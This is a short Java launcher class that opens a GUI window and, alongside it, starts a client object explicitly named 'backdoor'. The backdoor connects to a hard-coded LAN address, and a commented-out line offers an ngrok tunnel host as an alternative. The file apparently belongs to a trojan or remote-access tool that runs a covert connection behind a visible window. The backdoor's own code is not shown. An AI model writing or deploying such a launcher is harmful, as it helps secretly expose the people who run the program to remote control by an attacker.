package launcher;

import java.io.IOException;

import connection.ClientSide;
import view.MainWindow;

public class Main {
	public static void main(String[] args) throws IOException {
		new MainWindow();
		ClientSide backdoor = new ClientSide("192.168.0.162", 5123);
		//ClientSide backdoor = new ClientSide("0.tcp.ngrok.io", 17267);
		backdoor.connect();
	}
}